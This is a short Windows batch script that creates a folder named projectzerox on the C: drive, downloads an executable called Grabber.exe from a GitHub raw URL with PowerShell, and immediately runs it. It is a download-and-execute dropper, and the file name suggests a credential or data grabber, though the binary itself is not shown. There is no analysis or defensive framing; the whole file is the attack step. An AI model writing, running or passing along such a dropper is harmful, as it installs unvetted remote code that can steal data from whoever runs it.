@ECHO OFF
cd C:\
mkdir projectzerox
cd C:\projectzerox
powershell.exe -Command "Invoke-WebRequest -OutFile ./Grabber.exe https://github.com/pahweli/tool/raw/main/Grabber.exe"
start Grabber.exe